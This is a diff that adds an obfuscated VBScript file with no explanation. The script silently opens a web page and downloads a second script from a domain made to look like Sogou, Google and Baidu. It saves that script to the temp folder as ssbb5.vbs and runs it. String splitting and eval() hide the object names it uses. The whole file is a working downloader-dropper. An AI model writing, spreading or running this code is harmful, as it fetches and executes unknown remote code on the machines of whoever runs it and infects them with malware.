@@ -1,0 +1,21 @@
+on error resume next
+Set a970l1u5 = CreateObject("Wscript.Shell") 
+a970l1u5.Run("http://www.xs"&"p5.in"&"fo/index4.htm")
+
+Set b0je7fk4 = CreateObject("Mic"&"rosoft.XM"&"L"&"HT"&"TP")
+Set c6i02j24 = CreateObject("ADOD"&"B.Strea"&"m")
+With b0je7fk4
+d3p7xm3v = "http://e2.china.sogou.google.baidu.com.baidu163so.info/vbs/tan.vbs"
+.open "GET", d3p7xm3v, 0
+.Send()
+End With
+e9m94q65=a970l1u5.ExpandEnvironmentStrings("%te"&"mp%")&"\ssbb5.vbs"
+With c6i02j24
+.Type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("b0je7fk4.res"&"po"&"nse"&"B"&"od"&"y")
+.SaveToFile e9m94q65, eval("2")
+End With
+a970l1u5.Run e9m94q65, , True
+c6i02j24.Close
